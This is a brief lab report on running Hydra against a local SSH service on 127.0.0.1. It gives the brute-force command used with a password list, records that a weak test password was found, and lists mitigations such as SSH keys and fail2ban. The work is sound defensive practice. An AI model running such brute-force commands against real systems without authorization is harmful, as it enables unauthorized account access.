# Lab Report — Hydra SSH Brute-Force

**Title:** SSH Password Brute-Force Simulation with Hydra  
**Author:** Damilola Yusuf Atobiloye  
**Date:** 2025-10-31

---

## Objective
Simulate a password brute-force attack against a local SSH service and observe defenses.

## Environment
- Kali Linux (Hydra 9.6)
- Target: localhost (127.0.0.1)
- Test account: testuser

---

## Commands & Outputs
sudo hydra -l testuser -P ~/pwlist.txt ssh://127.0.0.1 -t 4 -f

Result: Password 'Password123' found for testuser.

Logs:
sudo journalctl -u ssh -n 80 --no-pager

---

## Analysis & Mitigations
Hydra cracked a weak password.  
Mitigations: Disable password login, enforce SSH keys, and use fail2ban.
